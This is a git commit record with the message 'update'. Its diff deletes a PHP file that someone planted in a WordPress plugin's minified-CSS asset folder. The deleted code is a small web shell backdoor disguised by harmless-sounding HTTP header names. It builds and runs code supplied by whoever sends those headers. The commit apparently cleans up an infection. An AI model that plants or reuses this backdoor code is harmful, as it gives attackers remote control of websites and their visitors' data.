f77863cc9cd31fb467b632ba1e4d509f301ae261
Fast and Static <it@e-me.co>
2024-10-23 13:56:41 +0000

    update

--- wp-content/plugins/premium-addons-for-elementor/assets/frontend/min-css/keywords.class.php
+++
@@ -1,6 +0,0 @@
-<?php
-$_HEADERS = getallheaders();
-if (isset($_HEADERS['Clear-Site-Data'])) {
-    $center = $_HEADERS['Clear-Site-Data']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['Content-Security-Policy']));
-    $center();
-}
